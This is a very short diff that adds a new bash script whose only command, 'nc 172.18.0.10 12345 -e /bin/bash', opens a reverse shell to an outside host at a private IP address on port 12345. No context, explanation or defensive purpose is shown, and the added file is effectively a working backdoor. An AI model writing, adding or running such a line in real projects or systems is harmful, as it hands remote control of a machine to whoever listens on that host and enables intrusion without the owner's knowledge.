@@ -1,0 +1,2 @@
+#!/bin/bash
+nc 172.18.0.10 12345 -e /bin/bash
